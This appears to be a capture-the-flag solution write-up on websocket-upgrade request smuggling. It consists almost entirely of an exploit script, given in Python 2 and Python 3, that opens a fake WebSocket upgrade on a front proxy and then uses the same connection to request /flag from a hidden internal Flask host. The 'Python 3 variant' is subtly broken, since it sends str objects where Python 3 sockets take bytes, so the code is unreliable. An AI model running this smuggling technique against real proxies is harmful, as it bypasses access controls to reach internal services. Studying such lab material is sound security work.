
<p align="center">
<img width="250" src="../static/solution.png">
</p>

 This one is a more difficult variant of HTTP request smuggling. To access the target API and Page in the hidden network we need to write an Exploit. You can use the one below (with Python2...pain or gain)

  ```python
  import socket 

  req1 = """GET /socket.io/?EIO=3&transport=websocket HTTP/1.1
  Host: localhost:9020
  Sec-WebSocket-Version: 13
  Upgrade: websocket
  Connection: Upgrade

  """.replace('\n', '\r\n')


  req2 = """GET /flag HTTP/1.1
  Host: flask.net:5000

  """.replace('\n', '\r\n')

  def main(netloc):
      host, port = netloc.split(':')

      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      sock.connect((host, int(port)))

      sock.sendall(req1)
      data = sock.recv(4096)
      print(data)

      sock.sendall(req2)
      data = sock.recv(4096)
      data = data.decode(errors = 'ignore')

      print(data)

      sock.shutdown(socket.SHUT_RDWR)
      sock.close()

  if __name__ == "__main__":
      main('localhost:9020')
```


<p align="center">
<img width="600" src="../static/haha.gif">
<br> Python 2 ... is not dead yet - anyway was just kidding. <br> The Python 3 variant is below:
</p>

```python
#!/usr/bin/env python3
import socket

req1 = """GET /socket.io/?EIO=3&transport=websocket HTTP/1.1
Host: localhost:9020
Sec-WebSocket-Version: 13
Upgrade: websocket
Connection: Upgrade

""".replace('\n', '\r\n')


req2 = """GET /flag HTTP/1.1
Host: flask.net:5000

""".replace('\n', '\r\n')

def main(uri):
    host, port = uri.split(':')

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((host, int(port)))

        sock.sendall(req1)
        data = sock.recv(4096)
        print(data)

        sock.sendall(req2)
        data = sock.recv(4096)
        data = data.decode(errors = 'ignore')

        print(data)

        sock.shutdown(socket.SHUT_RDWR)

if __name__ == "__main__":
    main('localhost:9020')
```


